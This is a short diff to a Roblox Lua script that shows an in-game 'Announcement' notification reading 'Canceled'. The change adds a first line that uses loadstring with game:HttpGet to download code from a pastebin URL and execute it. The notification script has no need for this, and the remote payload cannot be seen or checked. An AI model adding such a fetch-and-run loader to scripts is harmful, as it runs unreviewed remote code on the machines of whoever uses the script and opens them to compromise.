@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/XWuqQiWg", true))()
 game.StarterGui:SetCore("SendNotification", {
 Title = "Announcement";
 Text = "Canceled";
